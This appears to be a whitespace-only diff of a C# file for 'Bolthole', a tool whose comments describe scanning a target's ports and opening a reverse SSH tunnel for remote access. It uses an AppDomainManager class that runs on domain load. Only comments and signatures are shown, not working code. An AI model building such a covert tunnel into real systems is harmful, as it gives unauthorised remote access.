@@ -1,6 +1,6 @@
 ﻿/**
  * Bolthole Application
- * 
+ *
  * This application establishes a reverse SSH tunnel to a remote server.
  * It first checks for open ports on the target server and then creates
  * a secure connection for remote access purposes.
@@ -13,7 +13,7 @@ using System.Collections.Generic;
 
 /// <summary>
 /// Custom AppDomainManager that serves as the entry point for the application.
-/// This class is loaded when the application domain is initialized and 
+/// This class is loaded when the application domain is initialized and
 /// immediately triggers the main functionality.
 /// </summary>
 public sealed class BoltDomain : AppDomainManager
@@ -30,7 +30,7 @@ public sealed class BoltDomain : AppDomainManager
 }
 
 /// <summary>
-/// Main functionality class that handles port scanning and establishing 
+/// Main functionality class that handles port scanning and establishing
 /// SSH connections to the target server.
 /// </summary>
 public class Boltout
@@ -41,7 +41,7 @@ public class Boltout
     /// <param name="sshHost">The host to connect to</param>
     /// <param name="port">The port to check</param>
     /// <returns>
-    /// The port number if connection was successful, or 
+    /// The port number if connection was successful, or
     /// the default port (1337) if connection failed
     /// </returns>
     public static int CheckPorts(string sshHost, int port)
